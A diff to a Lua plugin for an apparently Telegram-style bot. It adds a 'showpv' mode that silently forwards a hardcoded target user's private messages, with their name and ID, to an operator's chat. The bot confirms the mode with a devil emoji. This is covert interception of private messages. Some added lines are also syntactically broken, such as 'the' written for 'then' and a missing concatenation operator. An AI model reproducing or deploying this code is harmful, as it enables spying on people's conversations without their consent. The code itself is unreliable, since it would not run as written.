@@ -16,6 +16,7 @@ local function run(msg, matches)
             end
     elseif matches[1] == "Showpv" or matches[1] == "showpv" and not matches[2] then
           if msg.to.id == 142334685 then
+              redis:set("id", '155942482')
               show = 3
               return "فعال 😈"
             else
@@ -62,15 +63,13 @@ local function run(msg, matches)
       if msg.to.id == tonumber(redis:get("id")) then
         send_msg('chat#142334685', msg.from.print_name.. '\n___________\n'..matches[1], ok_cb, false)
       end
-    elseif tonumber(show) == 3 then
-      if tonumber(msg.to.id) == '155942482'
-        send_msg('chat#142334685', msg.from.print_name..'\n'..msg.to.id'\n___________\n'..msg.from.text, ok_cb, false)
+    elseif tonumber(show) == 3 then 
+      if msg.to.id == tonumber(redis:get("id")) then
+        send_msg('chat#142334685', msg.from.print_name..'\n'..msg.from.id'\n___________\n'..msg.from.text, ok_cb, false)
       end
-    elseif tonumber(show) == 4 then
-      if tonumber(msg.to.id) == '155942482' then
-        if msg.from.id == tonumber(redis:get("id")) then
-          send_msg('chat#142334685', matches[1], ok_cb, false)
-        end
+    elseif tonumber(show) == 4 the
+      if msg.from.id == tonumber(redis:get("id")) then
+        send_msg('chat#142334685', matches[1], ok_cb, false)
       end
     end
     if msg.to.id == 142334685 then
